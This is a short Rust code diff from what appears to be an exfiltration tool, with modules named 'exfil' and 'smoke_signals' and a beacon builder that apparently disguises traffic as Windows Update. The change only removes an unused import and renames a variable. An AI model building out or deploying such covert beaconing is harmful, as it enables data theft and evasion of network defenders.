@@ -4,7 +4,6 @@
 
 use crate::exfil;
 use crate::smoke_signals::SmokeChannel;
-use rand::Rng;
 use tracing::{info, warn};
 use std::time::{Instant, Duration};
 
@@ -64,7 +63,7 @@ impl ChannelRotator {
                 data.len()
             }
             "smoke_wu" => {
-                let beacon = crate::smoke_signals::build_smoke_beacon(
+                let _beacon = crate::smoke_signals::build_smoke_beacon(
                     &SmokeChannel::WindowsUpdate, data
                 );
                 crate::smoke_signals::build_smoke_beacon(&SmokeChannel::random(), data);
